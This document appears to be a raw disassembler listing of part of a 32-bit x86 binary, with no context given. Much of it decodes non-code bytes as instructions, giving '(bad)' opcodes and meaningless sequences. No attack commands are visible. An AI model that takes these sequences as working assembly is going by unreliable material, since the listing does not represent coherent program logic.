  41b80d:	add    dl,ch
  41b80f:	lds    eax,FWORD PTR [eax]
  41b811:	add    BYTE PTR [eax],al
  41b813:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41b819:	mov    ecx,DWORD PTR [ebx-0x15cea975]
  41b81f:	push   esp
  41b820:	pop    edx
  41b821:	add    eax,0x5c9d4e7d
  41b826:	retf   0x7873
  41b829:	dec    ebp
  41b82a:	dec    esp
  41b82b:	stos   DWORD PTR es:[edi],eax
  41b82c:	mov    al,ds:0x45669019
  41b831:	mov    ebp,0x8b8bb88f
  41b836:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41b83c:	mov    ecx,DWORD PTR [eax]
  41b83e:	or     BYTE PTR [eax+0x851f17b],bl
  41b844:	or     BYTE PTR [edi],ch
  41b846:	mov    al,0xc0
  41b848:	jns    0x41b833
  41b84a:	les    ecx,FWORD PTR [edi]
  41b84c:	loopne 0x41b7f4
  41b84e:	xchg   ebp,eax
  41b84f:	lds    edi,FWORD PTR [ebx+0x59b33858]
  41b855:	aas    
  41b856:	fiadd  WORD PTR [eax]
  41b858:	mov    edx,0xc2b85aaf
  41b85d:	jne    0x41b8d7
  41b85f:	mov    cl,0x68
  41b861:	mov    al,ds:0x2fac9ba2
  41b866:	(bad)  
  41b867:	dec    ebp
  41b868:	or     BYTE PTR [eax],cl
  41b86a:	ret    
  41b86b:	adc    eax,0x915b0808
  41b870:	ror    DWORD PTR [eax],cl
  41b872:	add    al,bl
  41b874:	shl    DWORD PTR [ebp+0x4],0xe
  41b878:	mov    edx,esp
  41b87a:	jo     0x41b832
  41b87c:	sub    eax,0x513403
  41b881:	dec    edx
  41b882:	mov    eax,ds:0xc63212b2
  41b887:	fs loope 0x41b895
  41b88a:	jl     0x41b88c
  41b88c:	add    BYTE PTR [eax],al
  41b88e:	mov    edi,0x945ae625
  41b893:	ins    DWORD PTR es:[edi],dx
  41b894:	add    cl,bl
  41b896:	xchg   esp,eax
  41b897:	js     0x41b8fa
  41b899:	dec    esp
  41b89a:	loopne 0x41b885
  41b89c:	jp     0x41b840
  41b89e:	mov    bl,0x64
  41b8a0:	addr16 das 
  41b8a2:	inc    esp
  41b8a3:	out    0xf6,al
  41b8a5:	mov    ds:0xa0bf4ecc,al
  41b8aa:	into   
  41b8ab:	add    BYTE PTR [eax],al
  41b8ad:	iret   
  41b8ae:	pusha  
  41b8af:	push   0x0
	...
  41b8b9:	add    BYTE PTR [eax],al
  41b8bb:	add    al,al
  41b8bd:	push   ebx
  41b8be:	xchg   DWORD PTR [esp+ecx*1],ecx
  41b8c1:	or     al,0xc
  41b8c3:	or     al,0xc
  41b8c5:	or     al,0xc
  41b8c7:	or     al,0x75
  41b8c9:	jne    0x41b8cd
  41b8cb:	xchg   DWORD PTR [eiz*4-0x225c102],ebp
  41b8d2:	into   
  41b8d3:	das    
  41b8d4:	push   ebx
  41b8d5:	push   cs
  41b8d6:	gs inc esi
  41b8d8:	imul   esp,DWORD PTR [ebp+0x65],0x73732073
  41b8df:	inc    ebx
  41b8e0:	arpl   WORD PTR [ebp+ecx*1+0x65],bp
  41b8e4:	and    BYTE PTR [eax],ch
  41b8e6:	jb     0x41b955
  41b8e8:	jae    0x41b95c
  41b8ea:	jne    0x41b959
  41b8ec:	je     0x41b95d
  41b8ee:	ins    DWORD PTR es:[edi],dx
  41b8ef:	and    BYTE PTR [edi+0x73],ch
  41b8f2:	and    BYTE PTR [edx+esi*2+0x65],dh
  41b8f6:	inc    esp
  41b8f7:	inc    esp
  41b8f8:	arpl   WORD PTR [ecx+0x62],sp
  41b8fb:	inc    esp
  41b8fc:	ins    DWORD PTR es:[edi],dx
  41b8fd:	gs jb  0x41b974
  41b900:	gs or  ch,BYTE PTR fs:[edi+0x20]
  41b905:	ins    DWORD PTR es:[edi],dx
  41b906:	sub    BYTE PTR [esi+0x6e],ch
  41b909:	cs arpl WORD PTR gs:[eax],sp
  41b90d:	jo     0x41b95c
  41b90f:	or     ch,BYTE PTR [ecx+0x6d]
  41b912:	and    dh,BYTE PTR [ebp+ebp*2+0x67]
  41b916:	jbe    0x41b984
  41b918:	and    BYTE PTR [ebx+eiz*2+0x65],dh
  41b91c:	jb     0x41b984
  41b91e:	xor    ebp,DWORD PTR [edi]
  41b920:	ds ins DWORD PTR es:[edi],dx
  41b922:	and    eax,0x7b5a787f
  41b927:	das    
  41b928:	jg     0x41b8cd
  41b92a:	or     edx,0x74
  41b92d:	xor    BYTE PTR [ebp+0x75],0x75
  41b931:	add    BYTE PTR [ebp+0x75],dh
  41b934:	loop   0x41b8d1
  41b936:	jne    0x41b9ad
  41b938:	sbb    al,0xf6
  41b93a:	inc    edi
  41b93b:	mov    ebx,0xea3462fb
  41b940:	clc    
  41b941:	mov    bl,0x1f
  41b943:	inc    esi
  41b944:	cmp    BYTE PTR [eax],bh
  41b946:	out    0x95,al
  41b948:	lds    edx,FWORD PTR [ecx-0x63]
  41b94b:	mov    BYTE PTR [ecx],cl
  41b94d:	pop    esp
  41b94e:	cmp    BYTE PTR ss:[ebp+0x0],dh
  41b952:	xlat   BYTE PTR ds:[ebx]
  41b953:	aas    
  41b954:	sub    BYTE PTR [esi+0x0],cl
  41b957:	add    BYTE PTR [eax],al
  41b959:	mov    edi,0xf507ccb7
  41b95e:	mov    edi,0x6ddbe7f5
  41b963:	inc    eax
  41b964:	icebp  
  41b965:	pushf  
  41b966:	test   al,0xf3
  41b968:	add    dh,cl
  41b96a:	cmc    
  41b96b:	daa    
  41b96c:	adc    eax,0x52077c26
  41b971:	fcmovne st,st(0)
  41b973:	ins    BYTE PTR es:[edi],dx
  41b974:	mov    cl,0x45
  41b976:	and    eax,0xc4bcfed2
  41b97b:	(bad)  
  41b97c:	add    BYTE PTR [eax],al
  41b97e:	jns    0x41b91b
	...
  41b98c:	mov    dl,0x42
  41b98e:	adc    al,0x0
	...
  41b998:	add    BYTE PTR [eax],al
  41b99a:	xor    BYTE PTR [ebp+0xf8afc7b],0xd4
  41b9a1:	bound  ecx,QWORD PTR [esi-0x6d]
  41b9a4:	iret   
  41b9a5:	test   DWORD PTR [edi-0x29],esi
  41b9a8:	add    ebp,edi
  41b9aa:	mov    ebp,0x51b56946
  41b9af:	dec    sp
  41b9b1:	rol    BYTE PTR [eax],0x0
  41b9b4:	push   es
  41b9b5:	mov    edx,0x444280fb
  41b9ba:	inc    eax
  41b9bb:	fldcw  WORD PTR [ebp-0x61]
  41b9be:	bound  eax,QWORD PTR [edx+0x3e]
  41b9c1:	outs   dx,DWORD PTR ds:[esi]
  41b9c2:	test   eax,0xafa92fbb
  41b9c7:	pop    esp
  41b9c8:	sbb    esi,esi
  41b9ca:	jbe    0x41b9ea
  41b9cc:	(bad)  
  41b9cd:	xor    DWORD PTR [ebp+0x3078],esi
  41b9d3:	adc    al,0x6c
  41b9d5:	mov    ebp,0x3ef30000
  41b9da:	add    eax,DWORD PTR [eax]
  41b9dc:	test   DWORD PTR [eax+0x74],ecx
  41b9df:	dec    ecx
  41b9e0:	xor    al,BYTE PTR [esi-0x46]
  41b9e3:	neg    BYTE PTR [edx]
  41b9e5:	enter  0x6cd9,0x2c
  41b9e9:	dec    edx
  41b9ea:	popa   
  41b9eb:	dec    ebp
  41b9ec:	test   DWORD PTR [ecx-0x5d9fb09],ebx
  41b9f2:	jmp    0xb685:0x8585978b
  41b9f9:	ja     0x41b980
  41b9fb:	test   DWORD PTR [edi+0x50],edi
  41b9fe:	test   DWORD PTR [ebp+0x85],eax
  41ba04:	add    BYTE PTR [eax],al
  41ba06:	add    BYTE PTR [eax],al
  41ba08:	add    BYTE PTR [eax],al
  41ba0a:	fldenv [eax]
  41ba0c:	lods   eax,DWORD PTR ds:[esi]
  41ba0d:	mov    ebp,0x4ff0c977
  41ba12:	jge    0x41b9db
  41ba14:	mov    ebx,0xcd7c4fdc
  41ba19:	add    eax,0x301259db
  41ba1e:	push   0x7ee116
	...
  41ba2b:	add    BYTE PTR [eax],al
  41ba2d:	jp     0x41ba95
  41ba2f:	pop    esp
  41ba30:	mov    ch,0x0
  41ba32:	add    BYTE PTR [ebx+0x1b],dl
  41ba35:	pop    esp
  41ba36:	sbb    cl,bl
  41ba38:	aas    
  41ba39:	jecxz  0x41ba7d
  41ba3b:	popa   
  41ba3c:	loopne 0x41ba9a
  41ba3e:	xchg   edx,eax
  41ba3f:	in     al,0xe9
  41ba41:	inc    ecx
  41ba42:	ficom  WORD PTR [eax+0x3342e60c]
  41ba48:	out    dx,eax
  41ba49:	outs   dx,DWORD PTR ds:[esi]
  41ba4a:	test   DWORD PTR [edi-0xe],0xd610d624
  41ba51:	mov    ecx,0x57ebe632
  41ba56:	add    BYTE PTR [eax],al
  41ba58:	xchg   edx,eax
  41ba59:	sub    eax,DWORD PTR [eax]
  41ba5b:	add    dl,ch
  41ba5d:	jb     0x41bada
  41ba5f:	add    BYTE PTR [eax],al
  41ba61:	test   BYTE PTR [edi+0x18],bl
  41ba64:	es inc eax
  41ba66:	cmp    BYTE PTR [esi-0x6e],ah
  41ba69:	(bad)  
  41ba6a:	jge    0x41bae2
  41ba6c:	das    
  41ba6d:	dec    eax
  41ba6e:	pop    ebx
  41ba6f:	pop    ss
  41ba70:	push   0x3657a86b
  41ba75:	adc    DWORD PTR [edx],0x21
  41ba78:	sbb    eax,0xca000000
  41ba7d:	std    
  41ba7e:	mov    ebx,ss
  41ba80:	and    bh,bl
  41ba82:	(bad)  
  41ba83:	int3   
  41ba84:	cli    
  41ba85:	xchg   edx,eax
  41ba86:	pop    eax
  41ba87:	add    BYTE PTR [ecx+esi*8],cl
  41ba8a:	mov    dh,0xe1
  41ba8c:	jno    0x41ba9c
  41ba8e:	mov    edx,0x839c9f39
  41ba93:	popf   
  41ba94:	jae    0x41bad9
  41ba96:	mov    bh,0xec
  41ba98:	fild   DWORD PTR [eax]
  41ba9a:	add    BYTE PTR [edx],cl
  41ba9c:	lea    eax,[ebx+0x0]
  41ba9f:	add    BYTE PTR [eax],al
  41baa1:	(bad)  
  41baa2:	(bad)  
  41baa3:	(bad)  
  41baa4:	(bad)  
  41baa5:	(bad)  
  41baa6:	(bad)  
  41baa7:	(bad)  
  41baa8:	(bad)  
  41baa9:	inc    DWORD PTR [ebx+ebx*1]
  41baac:	popf   
  41baad:	push   0x6a
  41baaf:	push   0x6a
  41bab1:	push   0x6a
  41bab3:	push   0x6a
  41bab5:	push   0x4
  41bab7:	add    al,0xf0
  41bab9:	push   ebx
  41baba:	mov    ah,0x3c
  41babc:	cli    
  41babd:	sbb    eax,DWORD PTR [ecx]
  41babf:	aas    
  41bac0:	sbb    BYTE PTR [edx-0x33f53187],0x7
  41bac7:	and    eax,0x5bd94808
  41bacc:	pop    es
  41bacd:	ror    BYTE PTR [edi-0x9],0x4
  41bad1:	add    al,0x14
  41bad3:	aaa    
  41bad4:	add    al,0x4
  41bad6:	jle    0x41bac1
  41bad8:	add    al,0x4
  41bada:	addr16 hlt 
  41badc:	pop    ebp
  41badd:	gs icebp 
  41badf:	mov    esp,0x34c02cc3
  41bae4:	sub    al,0xc
  41bae6:	cmp    BYTE PTR [ebx-0x4b],dl
  41bae9:	mov    al,0x94
  41baeb:	inc    esi
  41baec:	dec    edi
  41baed:	cs ret 0x2146
  41baf1:	push   ebx
  41baf2:	add    al,0x0
  41baf4:	inc    esp
  41baf5:	in     al,0xd4
  41baf7:	xchg   ebx,eax
  41baf8:	add    BYTE PTR [eax],al
  41bafa:	add    BYTE PTR [ecx-0x1f],ch
  41bafd:	sar    BYTE PTR [edx],cl
  41baff:	sub    DWORD PTR [edi+0x7ef77316],edx
  41bb05:	inc    ch
  41bb07:	mov    ss,WORD PTR [esi+eiz*4]
  41bb0a:	jae    0x41bab4
  41bb0c:	dec    ebx
  41bb0d:	jg     0x41bac8
  41bb0f:	pop    ebx
  41bb10:	add    DWORD PTR [edx+0x37691cc1],edi
  41bb16:	xchg   ebp,eax
  41bb17:	jp     0x41bb97
  41bb19:	daa    
  41bb1a:	pop    eax
  41bb1b:	add    DWORD PTR [ebx+0x1f000096],eax
  41bb21:	push   0x0
	...
  41bb2e:	bound  ebx,QWORD PTR [eax-0x33333335]
  41bb34:	int3   
  41bb35:	int3   
  41bb36:	int3   
  41bb37:	int3   
  41bb38:	int3   
  41bb39:	int3   
  41bb3a:	mov    ecx,DWORD PTR [ebx-0x2041f7ad]
  41bb40:	popf   
  41bb41:	aas    
  41bb42:	stc    
  41bb43:	or     bh,dh
  41bb45:	and    al,0xb9
  41bb47:	iret   
  41bb48:	xchg   ecx,eax
  41bb49:	push   ecx
  41bb4a:	pop    eax
  41bb4b:	jne    0x41bb6d
  41bb4d:	je     0x41bbc3
  41bb4f:	jae    0x41bbb6
  41bb51:	ds jo  0x41bbc1
  41bb54:	and    BYTE PTR [ecx+0x65],al
  41bb57:	cmp    bh,BYTE PTR [eiz*2+0x62746c23]
  41bb5e:	and    BYTE PTR [ebp+0x65],ah
  41bb61:	or     ch,BYTE PTR [esi]
  41bb63:	outs   dx,BYTE PTR gs:[esi]
  41bb65:	outs   dx,DWORD PTR ds:[esi]
  41bb66:	imul   ebp,DWORD PTR [ebp+0x63],0x6e69532e
  41bb6d:	jb     0x41bbd7
  41bb6f:	outs   dx,BYTE PTR cs:[esi]
  41bb71:	arpl   WORD PTR [esi+ebp*1+0x65],si
  41bb75:	imul   ebp,DWORD PTR [ecx+0x75],0x73693e0a
  41bb7c:	jae    0x41bbe1
  41bb7e:	inc    ebx
  41bb7f:	gs or  eax,0x28204d65
  41bb85:	addr16 cs gs jb 0x41bbcb
  41bb8a:	popa   
  41bb8b:	and    BYTE PTR gs:[ebp+0x4d],dh
  41bb8f:	inc    esp
  41bb90:	jb     0x41bbc0
  41bb92:	and    BYTE PTR gs:[ebp+eiz*2+0x6e],ah
  41bb97:	jb     0x41bbec
  41bb99:	gs ins BYTE PTR es:[edi],dx
  41bb9b:	or     dh,BYTE PTR [eax+0x6c]
  41bb9e:	outs   dx,DWORD PTR gs:[esi]
  41bba0:	arpl   WORD PTR [ecx+0x69],bp
  41bba3:	outs   dx,BYTE PTR ds:[esi]
  41bba4:	imul   bp,WORD PTR cs:[edi+0x54],0x286d
  41bbab:	jbe    0x41bbcd
  41bbad:	gs jb  0x41bc1f
  41bbb0:	ds and BYTE PTR gs:[ecx+0x62],ch
  41bbb5:	bound  eax,QWORD PTR [ebp+ecx*1+0x65]
  41bbb9:	sub    al,0xa
  41bbbb:	jne    0x41bbfb
  41bbbd:	bound  esp,QWORD PTR [ebp+0x76]
  41bbc0:	inc    esp
  41bbc1:	popa   
  41bbc2:	ins    DWORD PTR es:[edi],dx
  41bbc3:	jne    0x41bc32
  41bbc5:	cmp    eax,0xde6d740a
  41bbca:	or     eax,0x90ba4f4f
  41bbcf:	arpl   WORD PTR [edi-0x75],bx
  41bbd2:	mov    ecx,DWORD PTR [esp+esi*1]
  41bbd5:	outs   dx,DWORD PTR ds:[esi]
  41bbd6:	repnz mov ebp,0x11a2006e
  41bbdc:	sar    DWORD PTR [ebx],0x2a
  41bbdf:	setb   BYTE PTR [eax-0x3445e048]
  41bbe6:	retf   0xa40f
  41bbe9:	mov    ds:0xb3118b29,eax
  41bbee:	outs   dx,DWORD PTR ds:[esi]
  41bbef:	pop    ds
  41bbf0:	mov    ecx,DWORD PTR [ebx-0x741ce526]
  41bbf6:	mov    esi,DWORD PTR [eax-0x41]
  41bbf9:	sub    BYTE PTR [ebx-0x7a652d00],cl
  41bbff:	xchg   ebp,eax
  41bc00:	out    dx,al
  41bc01:	outs   dx,BYTE PTR ds:[esi]
  41bc02:	pushf  
  41bc03:	xchg   ecx,eax
  41bc04:	adc    DWORD PTR [esi],esp
  41bc06:	adc    ebp,ebp
  41bc08:	add    DWORD PTR ds:0xcf386d7d,0x6ff0c040
  41bc12:	cmp    eax,0xe
  41bc17:	or     BYTE PTR [eax],dl
  41bc19:	add    BYTE PTR [eax],al
  41bc1b:	and    esi,eax
	...
  41bc29:	xchg   edx,eax
  41bc2a:	push   0xb0719929
  41bc2f:	add    eax,ecx
  41bc31:	std    
  41bc32:	shl    DWORD PTR [edx+0x6a],cl
  41bc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc36:	pop    esp
  41bc37:	ja     0x41bc15
  41bc39:	stc    
  41bc3a:	out    0x39,al
  41bc3c:	dec    esp
  41bc3d:	mov    edi,DWORD PTR [eax+0x75]
  41bc40:	mov    dh,0x0
	...
  41bc4a:	rol    al,0xca
  41bc4d:	aad    0x60
  41bc4f:	ins    DWORD PTR es:[edi],dx
  41bc50:	rol    al,0x6b
  41bc53:	leave  
  41bc54:	in     al,dx
  41bc55:	pushf  
  41bc56:	dec    ebx
  41bc57:	inc    ebp
  41bc58:	(bad)  
  41bc59:	frstor [ecx]
  41bc5b:	push   ebp
  41bc5c:	push   ss
  41bc5d:	ror    DWORD PTR [esi+0x31],0x26
  41bc61:	xchg   al,bh
  41bc63:	xchg   edx,eax
  41bc64:	cdq    
  41bc65:	ret    
  41bc66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc67:	pop    edx
  41bc68:	sbb    bl,BYTE PTR ds:0xecea7fa7
  41bc6e:	mov    al,0xf8
  41bc70:	adc    ebx,ebx
  41bc72:	inc    ecx
  41bc73:	addr16 dec edx
  41bc75:	rol    al,0x75
  41bc78:	(bad)  
  41bc79:	rol    al,0xcd
  41bc7c:	lock rol BYTE PTR fs:[eax],0xbc
  41bc81:	call   0x75b3:0x13ced89d
  41bc88:	xchg   ebp,eax
  41bc89:	sub    dh,dh
  41bc8b:	rcr    DWORD PTR [ecx+0x4adb4810],0xc6
  41bc92:	dec    esp
  41bc93:	les    esp,FWORD PTR [ebx+0xa]
  41bc96:	and    al,0x5a
  41bc98:	add    BYTE PTR [eax],al
  41bc9a:	add    BYTE PTR [eax],dl
  41bc9c:	in     eax,dx
  41bc9d:	or     BYTE PTR [eax],0x23
  41bca0:	mov    edx,0xa73c5eb4
  41bca5:	sahf   
  41bca6:	xchg   esi,eax
  41bca7:	mov    ah,0xe5
  41bca9:	es leave 
  41bcab:	icebp  
  41bcac:	sti    
  41bcad:	shr    cl,0xe5
  41bcb0:	bound  ebp,QWORD PTR [edi+0x5603b971]
  41bcb6:	out    dx,al
  41bcb7:	lock add BYTE PTR [eax],al
  41bcba:	je     0x41bc52
  41bcbc:	xchg   esi,eax
	...
  41bcc9:	adc    ah,ah
  41bccb:	sbb    al,0x74
  41bccd:	je     0x41bd43
  41bccf:	je     0x41bd45
  41bcd1:	je     0x41bd47
  41bcd3:	je     0x41bd49
  41bcd5:	add    BYTE PTR [eax],al
  41bcd7:	mov    esp,0xc55c26f1
  41bcdc:	sahf   
  41bcdd:	out    0x3b,al
  41bcdf:	ins    DWORD PTR es:[edi],dx
  41bce0:	xchg   ebp,eax
  41bce1:	aaa    
  41bce2:	jmp    0x41bcac
  41bce4:	mov    ah,BYTE PTR [edx+edi*8]
  41bce7:	mov    ebx,0xa2f9c5c3
  41bcec:	test   BYTE PTR [edx-0x5bffff08],cl
  41bcf2:	dec    esi
  41bcf3:	add    BYTE PTR [eax],al
  41bcf5:	mov    ah,BYTE PTR [esi-0x58910000]
  41bcfb:	imul   esi,DWORD PTR [ebx-0x74],0x4c
  41bcff:	popa   
  41bd00:	sub    al,0x3b
  41bd02:	sbb    ebx,edi
  41bd04:	sub    BYTE PTR [edx+0x4e79be7a],bh
  41bd0a:	mov    edi,0xcdaa8149
  41bd0f:	mov    ecx,0xd58b007b
  41bd14:	ins    DWORD PTR es:[edi],dx
  41bd15:	daa    
  41bd16:	cdq    
  41bd17:	mov    ecx,DWORD PTR [ebx-0x42a2de75]
  41bd1d:	mov    ebp,0x6e4e8a8c
  41bd22:	(bad)  
  41bd24:	push   es
  41bd25:	loope  0x41bd5a
  41bd27:	lea    ecx,[ebx-0x2d]
  41bd2a:	(bad)  
  41bd2b:	jnp    0x41bd70
  41bd2d:	shl    BYTE PTR [edx],0x30
  41bd30:	daa    
  41bd31:	cdq    
  41bd32:	sbb    DWORD PTR [ebp-0x47],esi
  41bd35:	pop    esi
  41bd36:	imul   edx,DWORD PTR ss:[ebx-0x7a7da09c],0x456a8b8b
  41bd41:	mov    ecx,DWORD PTR [ebx+0x7575758b]
  41bd47:	jne    0x41bdbe
  41bd49:	jne    0x41bdc0
  41bd4b:	jne    0x41bdc2
  41bd4d:	data16 mov BYTE PTR [ecx+0x0],bl
  41bd54:	add    BYTE PTR [eax],al
  41bd56:	add    BYTE PTR [eax],al
  41bd58:	add    BYTE PTR [eax],al
  41bd5a:	add    BYTE PTR [esi-0x80],al
  41bd5d:	or     BYTE PTR [esp+ebx*8+0x12],al
  41bd61:	or     BYTE PTR [ebx],0xb
  41bd64:	in     al,0xd5
  41bd66:	ret    
  41bd67:	stc    
  41bd68:	scas   eax,DWORD PTR es:[edi]
  41bd69:	pop    ebp
  41bd6a:	and    BYTE PTR [eax+0x6762f667],cl
  41bd70:	and    dh,BYTE PTR [esi+0x4b]
  41bd73:	add    BYTE PTR [eax],al
  41bd75:	aas    
  41bd76:	(bad)  
  41bd77:	dec    esp
  41bd78:	adc    DWORD PTR [ecx-0x26bcd69f],ebp
  41bd7e:	fnsave [edi-0x568bf509]
  41bd84:	mov    eax,0x7c7585cb
  41bd89:	sub    bh,BYTE PTR [esi]
  41bd8b:	xchg   esi,eax
  41bd8c:	and    esi,ebx
  41bd8e:	jmp    0x9a179c
  41bd93:	add    BYTE PTR [edx+ebp*4-0x5],bl
  41bd97:	add    BYTE PTR [eax],al
  41bd99:	or     ebx,DWORD PTR [ecx-0x4c]
  41bd9c:	add    BYTE PTR [eax],al
  41bd9e:	xor    dl,ch
  41bda0:	ja     0x41bd27
  41bda2:	fcmovnb st,st(2)
  41bda4:	lods   al,BYTE PTR ds:[esi]
  41bda5:	loop   0x41bda7
  41bda7:	(bad)  [ebx]
  41bda9:	and    bl,BYTE PTR [esi+0x39dbc06a]
  41bdaf:	push   ebx
  41bdb0:	mov    cs,WORD PTR [eax+ebp*2+0x3f]
  41bdb4:	mov    edx,0x6a
  41bdb9:	mov    BYTE PTR [ebx],0x0
  41bdbc:	add    BYTE PTR [esi+0x72],bl
	...
  41bdcb:	push   ebp
  41bdcc:	jo     0x41bd89
  41bdce:	inc    ecx
  41bdcf:	jne    0x41bdea
  41bdd1:	mov    gs,WORD PTR [ecx+0x73]
  41bdd4:	jne    0x41bdd9
  41bdd6:	daa    
  41bdd7:	ss and eax,0x953403a2
  41bddd:	inc    esp
  41bdde:	out    0x94,al
  41bde0:	add    DWORD PTR [ebp-0x74],ebx
  41bde3:	(bad)  
  41bde4:	(bad)  
  41bde5:	(bad)  
  41bde6:	(bad)  
  41bde7:	(bad)  
  41bde8:	(bad)  
  41bde9:	(bad)  
  41bdea:	(bad)  
  41bdeb:	inc    DWORD PTR [eax]
  41bded:	add    BYTE PTR [ebp+0xd88075],bl
  41bdf3:	add    BYTE PTR [edi+ebp*1+0x56],al
  41bdf7:	inc    edx
  41bdf8:	clc    
  41bdf9:	mov    ebp,0xa8754218
  41bdfe:	mov    ecx,0xaaefdea
  41be03:	or     ch,dh
  41be05:	xchg   esp,eax
  41be06:	inc    edi
  41be07:	lods   al,BYTE PTR ds:[esi]
  41be08:	xor    al,0x4a
  41be0a:	xor    DWORD PTR ds:[edi-0x77],0xffffffe4
  41be0f:	int    0x9b
  41be11:	jmp    0xf83a0574
  41be16:	test   DWORD PTR [eax],eax
  41be18:	add    BYTE PTR [edi+0x620000e8],bh
  41be1e:	pushf  
  41be1f:	inc    edi
  41be20:	add    BYTE PTR [eax],al
  41be22:	repnz dec esi
  41be24:	sub    eax,0x8618b236
  41be29:	dec    edx
  41be2a:	add    ch,BYTE PTR [eax+ecx*8]
  41be2d:	out    0x92,al
  41be2f:	mov    ebx,0xd28dfc91
  41be34:	ins    DWORD PTR es:[edi],dx
  41be35:	call   0xd0668c69
  41be3a:	add    BYTE PTR [eax],al
  41be3c:	add    BYTE PTR [esi+0x4d02466f],al
  41be42:	xchg   edi,eax
  41be43:	inc    edx
  41be44:	pop    edi
  41be45:	push   0x51
  41be47:	in     al,0xc8
  41be49:	jne    0x41be50
  41be4b:	pop    ebp
  41be4c:	pop    ds
  41be4d:	mov    DWORD PTR [ecx+0x7f],edx
  41be50:	repz and dl,ah
  41be53:	mov    ds:0x5c191dcf,eax
  41be58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be59:	or     al,BYTE PTR [eax]
  41be5b:	add    bh,dl
  41be5d:	scas   eax,DWORD PTR es:[edi]
  41be5e:	inc    esi
	...
  41be6b:	scas   al,BYTE PTR es:[edi]
  41be6c:	sbb    edx,DWORD PTR [edi-0x73]
  41be6f:	lea    ecx,[ebp-0x72727273]
  41be75:	lea    ecx,[ebp+0x269bffff]
  41be7b:	jp     0x41be1f
  41be7d:	es in  eax,dx
  41be7f:	shl    BYTE PTR [edx+0x5a96fdcf],0xee
  41be86:	adc    BYTE PTR [ebx+0x4f],al
  41be89:	adc    al,0x49
  41be8b:	cdq    
  41be8c:	dec    ebx
  41be8d:	repnz stc 
  41be8f:	jnp    0x41be6e
  41be91:	(bad)  
  41be92:	jmp    ebp
  41be94:	nop
  41be95:	(bad)  
  41be96:	inc    DWORD PTR [esi+ebx*1-0x1]
  41be9a:	push   DWORD PTR [ebx]
  41be9c:	sub    al,0x46
  41be9e:	jmp    0x5311:0xbbc30d60
  41bea5:	push   eax
  41bea6:	pop    es
  41bea7:	ins    BYTE PTR es:[edi],dx
  41bea8:	fnstcw WORD PTR [ebx]
  41beaa:	push   cs
  41beab:	in     eax,dx
  41beac:	out    dx,eax
  41bead:	or     al,bh
  41beaf:	cwde   
  41beb0:	ror    DWORD PTR [ebp-0xd],cl
  41beb3:	inc    DWORD PTR [eax]
  41beb5:	in     eax,0x58
  41beb7:	push   0xffffff81
  41beb9:	add    BYTE PTR [eax],al
  41bebb:	add    BYTE PTR [edi+eiz*2+0x7bf916be],dh
  41bec2:	lock ret 0x37ca
  41bec6:	std    
  41bec7:	cmp    eax,DWORD PTR [ebp-0x3e67004b]
  41becd:	test   eax,0x10c63d8f
  41bed2:	fbstp  TBYTE PTR [ebp*2+0x769eb644]
  41bed9:	fsub   st,st(3)
  41bedb:	push   ds
  41bedc:	mov    bl,0x11
  41bede:	dec    esp
  41bedf:	add    BYTE PTR [eax],al
  41bee1:	int3   
  41bee2:	mov    esp,0x85000000
  41bee7:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  41beed:	test   DWORD PTR [ebp+0x757f7f],eax
	...
  41befb:	add    BYTE PTR [eax],al
  41befd:	cmp    al,0x9e
  41beff:	jmp    0x41bf3b
  41bf01:	int3   
  41bf02:	add    DWORD PTR [ecx+0x299e4862],esp
  41bf08:	sub    al,0x44
  41bf0a:	fidiv  WORD PTR [eax-0x65d68dd7]
  41bf10:	cmp    BYTE PTR [esi+0x8c3b27],ch
  41bf16:	add    ah,dl
  41bf18:	adc    DWORD PTR [esi],edx
  41bf1a:	out    dx,eax
  41bf1b:	sbb    eax,0xd7f39d92
  41bf20:	sbb    DWORD PTR [edi+0x6f5d9d8a],esp
  41bf26:	hlt    
  41bf27:	jecxz  0x41bef4
  41bf29:	loope  0x41becc
  41bf2b:	aad    0xf7
  41bf2d:	lea    ebp,[esi+0x4a]
  41bf30:	popa   
  41bf31:	dec    eax
  41bf32:	mov    ebp,0x28000082
  41bf37:	sbb    ch,BYTE PTR [eax+0x0]
  41bf3a:	add    BYTE PTR [eax+ecx*8],bl
  41bf3d:	xchg   ebp,eax
  41bf3e:	add    BYTE PTR [eax],al
  41bf40:	div    DWORD PTR [ebx]
  41bf42:	sbb    BYTE PTR [edi+ecx*2-0x35999b59],cl
  41bf49:	push   ss
  41bf4a:	ss (bad) 
  41bf4c:	sar    DWORD PTR [ebp-0x9],1
  41bf4f:	mov    ds:0x7549eb6e,al
  41bf54:	xor    DWORD PTR [ecx],0xdcde
  41bf5a:	add    al,dl
  41bf5c:	xlat   BYTE PTR ds:[ebx]
  41bf5d:	add    BYTE PTR [eax],al
  41bf5f:	fisttp DWORD PTR [edi+0x0]
  41bf65:	add    BYTE PTR [eax],al
  41bf67:	add    BYTE PTR [eax],al
  41bf69:	add    BYTE PTR [ebp+0x3c],ah
  41bf6c:	sub    BYTE PTR [ebp+0x65],ah
  41bf6f:	and    BYTE PTR [ecx+0x65],al
  41bf72:	and    BYTE PTR [esp+ebp*2+0x61],dh
  41bf76:	outs   dx,BYTE PTR ds:[esi]
  41bf77:	push   0x62656f70
  41bf7c:	and    BYTE PTR [eax],ah
  41bf7e:	and    BYTE PTR [esi+0x6d],ah
  41bf81:	outs   dx,DWORD PTR ds:[esi]
  41bf82:	jb     0x41bfe7
  41bf84:	jae    0x41bfaf
  41bf86:	push   ebx
  41bf87:	jb     0x41bff6
  41bf89:	push   edx
  41bf8a:	cmp    eax,0x6d416570
  41bf8f:	and    BYTE PTR [ebx+0x2f],dl
  41bf92:	jae    0x41c002
  41bf94:	ins    DWORD PTR es:[edi],dx
  41bf95:	ins    DWORD PTR es:[edi],dx
  41bf96:	and    BYTE PTR [edx+0x63],ah
  41bf99:	outs   dx,BYTE PTR cs:[esi]
  41bf9b:	outs   dx,DWORD PTR ds:[esi]
  41bf9c:	ins    DWORD PTR es:[edi],dx
  41bf9d:	jbe    0x41bfcd
  41bf9f:	jb     0x41bff3
  41bfa1:	imul   ebp,DWORD PTR [esi+0x70],0x6d696e69
  41bfa8:	jns    0x41bff7
  41bfaa:	data16 arpl WORD PTR [ebx+0x73],ax
  41bfae:	arpl   WORD PTR ds:0x6c207466,cx
